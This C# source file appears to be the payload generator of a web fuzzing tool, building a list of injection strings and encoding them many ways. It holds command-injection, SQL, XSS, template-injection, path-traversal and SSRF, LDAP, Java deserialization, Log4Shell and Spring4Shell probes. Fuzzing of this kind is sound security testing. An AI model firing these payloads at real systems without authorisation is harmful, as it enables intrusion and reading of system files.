using System;
using System.Linq;
using System.Web;
using System.Collections.Generic;
using System.Net;


namespace CShidori
{
    public class BadStrings
    {
        public List<string> Output { get; set; }

        public BadStrings()
        {

            List<string> results = new List<string>();
            string ip = Misc.GetIp();
            
            String[] misc = new string[] {
            "*",";", "&", "%", ";", "[", "]", "(", ")","|", "?", "\\", "'", "\"", "@", "#", "!",
            "null","$null", "`whoami`", "uname%20-a", "%3Bcat%20/etc/passwd", ""
            };
            results.AddRange(misc);

            String[] url = new string[] { 
            "%3d", //=
            "%25", "&#37", // %
            "%20",// space
            "%0a", "%0d%0atest", "%E5%98%8A%E5%98%8D", // new line
            "%00" // null byte
            };
            results.AddRange(url);

            String[] unicode = new string[] {
            "%u2215", // /
            };
            results.AddRange(unicode);

            String[] utf8 = new string[] {
            "%c2%a9", // (c)
            };


            String[] html = new string[] {
            "&quot;", "&#34;", "&#x22;", // "
            "&pos;", "&#39;", "&#x27;", // '
            "&amp;",// &
            "&lt;", // <
            "&gt;", // >
            "n\nn","r\rr", "s\\s"            
            };
            results.AddRange(html);


            String[] sql = new string[] { //and XPATH
            "1'", "1' or '1' = '1", "1' or '1' = '1')) LIMIT 1/*", "10 AND 1=2"
            };
            results.AddRange(sql);


            String[] xss = new string[] {
            "<", "%3c", "%253c", "«", "+ADw-", // <
            ">", "%3e", "%253e", "»", "+AD4-", // >
            "&",
            "'","\"",
             "test><script>alert(1);</script>", "test\" onfocus=alert(2) autofocus \"", "'test';alert(3);'';",
             "javascript:alert(4)",
            };
            results.AddRange(xss);

            String[] ssti = new string[] { // SSTI, CSTI, SSI
            "test{{7+7}}", "<!--#exec cmd=\"/bin/ps ax\"-->", "}}<tag>"
            };
            results.AddRange(ssti);

            String[] rfi = new string[] { // LFI and SSRF and openredirect
            "http://"+ip+"/", "http://127.0.0.1/", "https://127.1/", "ftp://0x7f000001/", "smb://0000::1:445/", "file:///etc/passwd",
            "./../../../etc/passwd", "zip:///filename_path", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            ".", "\\", "/", "..//", "....\\\\", "c$:\\",
            };
            results.AddRange(rfi);

            String[] integer = new string[] {
            "0x7f", "0x80",
            "0xff", "0x100",
            "0x0", "0xffffffff", "-1"
            };
            results.AddRange(integer);

            String[] json = new string[] {
            "test}}{", 
            };
            results.AddRange(json);

            String[] xml = new string[] {
            "foo<", "foo'", "foo<!--", "&foo", "]]>", "foo</bar>"
            };
            results.AddRange(xml);

            String[] ldap = new string[] {
             "*",
             "*)(&",
             "*)(|&",
             "pwd)",
             "*)(|(*",
             "*))%00",
             "admin)(&)",
             "user=*)(uid=*))(|(uid=*",

            };
            results.AddRange(ldap);

            String[] get = new string[] {
            "test&foo=",
            };
            results.AddRange(get);


            String[] java = new string[] {            
            "rO0ABX1////3",  // ObjectInputStream DoS
            "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=", //Nested Object[] (44 bytes):
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=", //Nested ArrayList (67 bytes):
            "${jndi:ldap://"+ip+"/a}", "${java:version}", //log4Shell
            "class.module.classLoader.URLs%5B0%5D=0" //spring4shell (resp = 400)
            };
            results.AddRange(java);


            String[] bof = new string[] {
                string.Concat(Enumerable.Repeat("%s", 10)), // format string
                string.Concat(Enumerable.Repeat("%n", 10)) , // format string
                string.Concat(Enumerable.Repeat("A", 500)) //BoF
            };
            results.AddRange(bof);


            results = results.Distinct().ToList();
            results = encodebadchars(results);
            /* ---- declared after -> not encoded ---- */

            this.Output = results;
        }


        public List<string> encodebadchars ( List<string> results)
        {
            string hexstr;
            string r2;
            string htmlASCIIEndoed;
            string htmlASCIIHexEndoed;
            int val;
            List<string> tmp = new List<string>();
            foreach (string r in results)
            {
                tmp.Add(Uri.EscapeUriString(r)); //best
                tmp.Add(HttpUtility.UrlEncode(r));
                tmp.Add(HttpUtility.UrlEncodeUnicode(r));
                tmp.Add(HttpUtility.HtmlEncode(r));

                //Escape quotes
                r2 = r.Replace("\"", "\\\"").Replace("'","\\'");
                if (r != r2)
                {
                    tmp.Add(r2);
                }
                
                //hexEscape
                hexstr = string.Empty;
                foreach(char c in r)
                {
                    try
                    {
                        hexstr += Uri.HexEscape(c);
                    }
                    catch
                    {
                        hexstr += c;
                    }
                }
                tmp.Add(hexstr);


                //html ascii:
                htmlASCIIEndoed = string.Empty;
                htmlASCIIHexEndoed = string.Empty;
                foreach (char c in r)
                {
                    try
                    {
                        val = Convert.ToInt32(c);
                        if(val < 128) //if ASCCI not extended
                        {
                            htmlASCIIEndoed += "&#" + val.ToString() + ";";
                            htmlASCIIHexEndoed += "&#x" + val.ToString("X") + ";";
                        }
                    }
                    catch
                    {
                        htmlASCIIEndoed += c;
                    }
                }
                tmp.Add(htmlASCIIEndoed);
                tmp.Add(htmlASCIIHexEndoed);
            }
       
            results.AddRange(tmp);
            return results.Distinct().ToList();

        }
    
    }

}
